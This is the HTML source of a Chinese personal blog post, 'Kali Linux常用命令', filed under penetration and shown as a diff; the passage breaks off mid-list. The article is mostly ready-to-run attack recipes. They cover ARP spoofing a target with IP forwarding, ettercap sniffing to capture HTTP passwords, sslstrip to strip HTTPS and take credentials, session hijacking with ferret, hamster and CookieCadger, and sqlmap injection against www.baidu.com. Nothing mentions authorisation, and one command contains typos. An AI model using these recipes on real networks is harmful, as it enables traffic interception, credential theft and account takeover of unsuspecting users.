@@ -1,0 +1,3120 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Kali Linux常用命令, M">
+    <meta name="description" content="一个分享快乐的网站！">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Kali Linux常用命令 | MX</title>
+    <link rel="icon" type="image/png" href="/medias/logo.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/js/utils.js"></script>
+    <script src="/libs/jquery/jquery.min.js"></script>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="MX" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+<body>
+<!-- 页面加载动画 -->
+
+
+
+
+    <div id="loading">
+        <style type="text/css">
+            #loading {
+                position: fixed;
+                top: 0;
+                left: 0;
+                min-height: 100vh;
+                width: 100vw;
+                z-index: 9999;
+                display: none;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                text-align: center;
+            }
+
+            .loader {
+                width: 20em;
+                height: 20em;
+                font-size: 10px;
+                position: relative;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .loader .face {
+                position: absolute;
+                border-radius: 50%;
+                border-style: solid;
+                animation: animate 3s linear infinite;
+            }
+
+            .loader .face:nth-child(1) {
+                width: 100%;
+                height: 100%;
+                color: gold;
+                border-color: currentColor transparent transparent currentColor;
+                border-width: 0.2em 0.2em 0em 0em;
+                --deg: -45deg;
+                animation-direction: normal;
+            }
+
+            .loader .face:nth-child(2) {
+                width: 70%;
+                height: 70%;
+                color: lime;
+                border-color: currentColor currentColor transparent transparent;
+                border-width: 0.2em 0em 0em 0.2em;
+                --deg: -135deg;
+                animation-direction: reverse;
+            }
+
+            .loader .face .circle {
+                position: absolute;
+                width: 50%;
+                height: 0.1em;
+                top: 50%;
+                left: 50%;
+                background-color: transparent;
+                transform: rotate(var(--deg));
+                transform-origin: left;
+            }
+
+            .loader .face .circle::before {
+                position: absolute;
+                top: -0.5em;
+                right: -0.5em;
+                content: '';
+                width: 1em;
+                height: 1em;
+                background-color: currentColor;
+                border-radius: 50%;
+                box-shadow: 0 0 2em,
+                0 0 4em,
+                0 0 6em,
+                0 0 8em,
+                0 0 10em,
+                0 0 0 0.5em rgba(255, 255, 0, 0.1);
+            }
+
+            @keyframes animate {
+                to {
+                    transform: rotate(1turn);
+                }
+            }
+        </style>
+        <div class="loader">
+            <div class="face">
+                <div class="circle"></div>
+            </div>
+            <div class="face">
+                <div class="circle"></div>
+            </div>
+        </div>
+    </div>
+
+
+
+<header>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">MX</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/time" class="waves-effect waves-light">
+      
+      <i class="fas fa-history" style="zoom: 0.6;"></i>
+      
+      <span>倒计时</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="javascript:;" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-ellipsis-v" style="zoom: 0.6;"></i>
+      
+      <span>文章</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>标签</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>分类</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>归档</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="javascript:;" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-id-card" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>关于我</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/sakura">
+          
+          <i class="fas fa-user-secret" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>博主简介</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://home.mx142.cn/" target="_blank" rel="noopener">
+          
+          <i class="fas fa-home" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>主页</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="javascript:;" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-fw fa fa-link" style="zoom: 0.6;"></i>
+      
+      <span>链接</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/contact">
+          
+          <i class="fas fa-comments" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>留言板</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>友人</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/yljk">
+          
+          <i class="fas fa-sync" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>友链监控</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friendcircle">
+          
+          <i class="fas fa-puzzle-piece" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>朋友圈</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="javascript:;" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>导航</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/navigate">
+          
+          <i class="fas fa-search" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>常用网站</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/box">
+          
+          <i class="fas fa-location-arrow" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>网页导航</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="javascript:;" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>媒体</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/AV">
+          
+          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>视听</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/galleries">
+          
+          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>相册</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/yl">
+          
+          <i class="fas fa-map-marker" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>娱乐</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="javascript:;" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-dice-d20" style="zoom: 0.6;"></i>
+      
+      <span>实验室</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/audio">
+          
+          <i class="fas fa-compact-disc" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>音乐隧道</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/lxsd">
+          
+          <i class="fas fa-volume-up" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>菱形隧道</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/cjdjs">
+          
+          <i class="fas fa-history" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>新年倒计时</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/flowers">
+          
+          <i class="fas fa-hands" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>樱花雨</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/xkl">
+          
+          <i class="fas fa-gamepad" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>谷歌小恐龙</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/ND">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>国庆头像生成</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li id="search">
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">MX</div>
+        <div class="logo-desc">
+            
+            一个分享快乐的网站！
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/time" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-history"></i>
+			
+			倒计时
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-ellipsis-v"></i>
+			
+			文章
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/tags " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>标签</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>分类</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/archives " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>归档</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/about " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-id-card" style="position: absolute;left:50px" ></i>
+			      
+		          <span>关于我</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/sakura " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-user-secret" style="position: absolute;left:50px" ></i>
+			      
+		          <span>博主简介</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="https://home.mx142.cn/ " target="_blank" rel="noopener" style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-home" style="position: absolute;left:50px" ></i>
+			      
+		          <span>主页</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-fw fa fa-link"></i>
+			
+			链接
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/contact " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-comments" style="position: absolute;left:50px" ></i>
+			      
+		          <span>留言板</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/friends " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>友人</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/yljk " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-sync" style="position: absolute;left:50px" ></i>
+			      
+		          <span>友链监控</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/friendcircle " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-puzzle-piece" style="position: absolute;left:50px" ></i>
+			      
+		          <span>朋友圈</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			导航
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/navigate " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-search" style="position: absolute;left:50px" ></i>
+			      
+		          <span>常用网站</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/box " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-location-arrow" style="position: absolute;left:50px" ></i>
+			      
+		          <span>网页导航</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			媒体
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/AV " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
+			      
+		          <span>视听</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/galleries " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
+			      
+		          <span>相册</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/yl " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-map-marker" style="position: absolute;left:50px" ></i>
+			      
+		          <span>娱乐</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-dice-d20"></i>
+			
+			实验室
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/audio " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-compact-disc" style="position: absolute;left:50px" ></i>
+			      
+		          <span>音乐隧道</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/lxsd " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-volume-up" style="position: absolute;left:50px" ></i>
+			      
+		          <span>菱形隧道</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/cjdjs " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-history" style="position: absolute;left:50px" ></i>
+			      
+		          <span>新年倒计时</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/flowers " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-hands" style="position: absolute;left:50px" ></i>
+			      
+		          <span>樱花雨</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/xkl " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-gamepad" style="position: absolute;left:50px" ></i>
+			      
+		          <span>谷歌小恐龙</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/ND " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>国庆头像生成</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+</header>
+
+<!-- 元宵节灯笼样式开始 -->
+<style>
+    @media only screen and (min-width: 1124px) {
+        .nav-menu {
+            padding-right: 96px;
+        }
+    }
+    @media only screen and (max-width: 760px) {
+        .deng-box, .deng-box1 {
+            width: 40%;
+        }
+        .right {
+            float: left!important;
+        }
+    }
+    @media only screen and (min-width: 768px) and (max-width: 1024px) {
+        .right {
+            float: left!important;
+        }
+    }
+    .deng-box {
+        position: fixed;
+        top: -40px;
+        right: -20px;
+        z-index: 999;
+    }
+    .deng-box1 {
+        position: fixed;
+        top: -30px;
+        right: 10px;
+        z-index: 999;
+    }
+    .deng-box1 .deng {
+        position: relative;
+        width: 120px;
+        height: 90px;
+        margin: 50px;
+        background: #d8000f;
+        background: rgba(216, 0, 15, 0.8);
+        border-radius: 50% 50%;
+        -webkit-transform-origin: 50% -100px;
+        -webkit-animation: swing 5s infinite ease-in-out;
+        box-shadow: -5px 5px 30px 4px rgba(252, 144, 61, 1);
+    }
+    .deng {
+        position: relative;
+        width: 120px;
+        height: 90px;
+        margin: 50px;
+        background: #d8000f;
+        background: rgba(216, 0, 15, 0.8);
+        border-radius: 50% 50%;
+        -webkit-transform-origin: 50% -100px;
+        -webkit-animation: swing 3s infinite ease-in-out;
+        box-shadow: -5px 5px 50px 4px rgba(250, 108, 0, 1);
+    }
+    .deng-a {
+        width: 100px;
+        height: 90px;
+        background: #d8000f;
+        background: rgba(216, 0, 15, 0.1);
+        margin: 12px 8px 8px 10px;
+        border-radius: 50% 50%;
+        border: 2px solid #dc8f03;
+    }
+    .deng-b {
+        width: 45px;
+        height: 90px;
+        background: #d8000f;
+        background: rgba(216, 0, 15, 0.1);
+        margin: -4px 8px 8px 26px;
+        border-radius: 50% 50%;
+        border: 2px solid #dc8f03;
+    }
+    .xian {
+        position: absolute;
+        top: -20px;
+        left: 60px;
+        width: 2px;
+        height: 20px;
+        background: #dc8f03;
+    }
+    .shui-a {
+        position: relative;
+        width: 5px;
+        height: 20px;
+        margin: -5px 0 0 59px;
+        -webkit-animation: swing 4s infinite ease-in-out;
+        -webkit-transform-origin: 50% -45px;
+        background: #ffa500;
+        border-radius: 0 0 5px 5px;
+    }
+    .shui-b {
+        position: absolute;
+        top: 14px;
+        left: -2px;
+        width: 10px;
+        height: 10px;
+        background: #dc8f03;
+        border-radius: 50%;
+    }
+    .shui-c {
+        position: absolute;
+        top: 18px;
+        left: -2px;
+        width: 10px;
+        height: 35px;
+        background: #ffa500;
+        border-radius: 0 0 0 5px;
+    }
+    .deng:before {
+        position: absolute;
+        top: -7px;
+        left: 29px;
+        height: 12px;
+        width: 60px;
+        content: " ";
+        display: block;
+        z-index: 999;
+        border-radius: 5px 5px 0 0;
+        border: solid 1px #dc8f03;
+        background: #ffa500;
+        background: linear-gradient(to right, #dc8f03, #ffa500, #dc8f03, #ffa500, #dc8f03);
+    }
+    .deng:after {
+        position: absolute;
+        bottom: -7px;
+        left: 10px;
+        height: 12px;
+        width: 60px;
+        content: " ";
+        display: block;
+        margin-left: 20px;
+        border-radius: 0 0 5px 5px;
+        border: solid 1px #dc8f03;
+        background: #ffa500;
+        background: linear-gradient(to right, #dc8f03, #ffa500, #dc8f03, #ffa500, #dc8f03);
+    }
+    @font-face {
+        font-family: "华文行楷";
+        src: url('/fonts/华文行楷.ttf');
+    }
+    .deng-t {
+        font-family: 华文行楷;
+        font-size: 26px;
+        color: #dc8f03;
+        font-weight: bold;
+        line-height: 44px;
+        text-align: center;
+    }
+    .night .deng-t,
+    .night .deng-box,
+    .night .deng-box1 {
+        background: transparent !important;
+    }
+    @-moz-keyframes swing {
+        0% {
+                -moz-transform: rotate(-10deg)
+        }
+        50% {
+             -moz-transform: rotate(10deg)
+        }
+        100% {
+                -moz-transform: rotate(-10deg)
+        }
+    }
+    @-webkit-keyframes swing {
+        0% {
+                -webkit-transform: rotate(-10deg)
+        }
+        50% {
+                -webkit-transform: rotate(10deg)
+        }
+        100% {
+                -webkit-transform: rotate(-10deg)
+        }
+    }
+</style>
+<div class="deng-box">
+    <div class="deng">
+        <div class="xian"></div>
+        <div class="deng-a">
+            <div class="deng-b"><div class="deng-t">喜迎</div></div>
+        </div>
+        <div class="shui shui-a"><div class="shui-c"></div><div class="shui-b"></div></div>
+    </div>
+</div>
+<div class="deng-box1">
+    <div class="deng">
+        <div class="xian"></div>
+        <div class="deng-a">
+            <div class="deng-b"><div class="deng-t">元旦</div></div>
+        </div>
+        <div class="shui shui-a"><div class="shui-c"></div><div class="shui-b"></div></div>
+    </div>
+</div>
+<!-- 元宵节灯笼样式结束 -->
+
+</header>
+
+<main id="main_wrap">
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://img.imgdb.cn/item/600819153ffa7d37b3985dc3.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Kali Linux常用命令</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    .toc-fixed .toc-link::before {
+        position: fixed !important; /*当toc的位置改为fixed时，.toc-link::before也要改为fixed*/
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 255px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 45px;
+        height: 45px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <!-- 春节主题 小挂件 -->
+        <div class="caishendeng"> 
+            <div class="caishenxian">
+                <img class="caishenpic lala" src="https://nekodeng.gitee.io/medias/spring-img/fudao.png"> 
+            </div> 
+        </div>
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Linux/">
+                                <span class="chip bg-color">Linux</span>
+                            </a>
+                        
+                            <a href="/tags/Kali/">
+                                <span class="chip bg-color">Kali</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                渗透
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-01-20
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-01-20
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    9 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>端口扫描</p>
+<pre><code>nmap -sS 目标ip
+Arp 内网断网
+Arpspoof -i 网卡 -t 目标ip 网关
+获取网卡/网关
+ifconfig
+获取内网ip
+fping -asg 192.168.1.0/24
+Arp 欺骗
+echo 写命令，是不会有回显的
+ehco 1 &gt;proc/sys/net/ipv4/ip_forward</code></pre><p>进行IP流量转发</p>
+<p>目标 –》 我的网卡 –》网关</p>
+<pre><code>driftnet --&gt; 获取本机网卡的图片
+driftnet -i eth0 获取本机网卡的图片
+ifconfig #查看网络信息
+iwconfig #查看网卡信息
+kali中查找程序或命令
+ex:sqlmap 
+find / -name sqlmap
+find / -name ettercap</code></pre><p>HTTP 帐号密码获取</p>
+<pre><code>Arpspoof --&gt; 欺骗
+Ettercap --&gt; 欺骗 DNS欺骗 流量 嗅探
+实战前的信息采集：
+目标机器： 目标ip，网关
+攻击机器： kali ip
+arpspoof -i eth0 -t 目标ip 网关
+开启ip转发
+echo 1 &gt;/proc/sys/net/ipv4/ip_forward
+cat 查看内容
+cat /proc/sys/net/ipv4/ip_forward
+启动ettercap进行流量嗅探
+ettercap -Tq -i eth0
+-Tq --&gt; -T: 启动文本模式，q:安静模式；
+-i --&gt; i: 网关；
+url解码：www.convertstring.com</code></pre><p>HTTPS 账户密码获取</p>
+<pre><code>vim /etc/ettercap/etter.conf
+修改iptables规则
+去掉注释符号
+保存推出
+sslstrip --》 可以把HTTPS还原为http
+arpspoof -i eth0 -t 目标ip 网关
+开启ip转发
+echo 1 &gt;/proc/sys/net/ipv4/ip_forward
+ettercap -Tq -i eth0
+sslstrip -a -f -k
+缺点：容易出现证书错误！</code></pre><p>会话劫持<br>需要的工具</p>
+<pre><code>Arpspoof ==&gt; Arp欺骗
+Wireshark ==&gt; 抓包
+ferret ==&gt; 重新生成抓包后的文件
+hamster ==&gt; 重放流量
+#trip1：基于arp欺骗
+arpspoof
+arpspoof -i eth0 -t 目标ip 网关 
+echo 1 &gt;/proc/sys/net/ipv4/ip_forward
+start Wireshark #开始抓包
+
+ferret -r cockie.pcap #生成hamster.txt
+
+#trip2：基于ferret
+ferret -1 eth0
+hamster
+
+#trip3：基于CookieCadger.jar一键劫持
+install CookieCadger
+选择网卡
+动态截取流量</code></pre><p>SqlMap<br>asp 网站，大多用的Access 文件 数据库 MSSQL数据库<br>数据库表<br>字段(列)</p>
+<pre><code>sqlmap -u http://www.baidu.com
+-u 检测是否存在注入
+成功，返回数据库信息
+sqlmap -u www.baidu.com --tables
+暴力猜解所有表名（有点慢）
+sqlmap -u http://www.baidu.com --columns -T &quot;user&quot;
+--columns 猜列名 根据user 
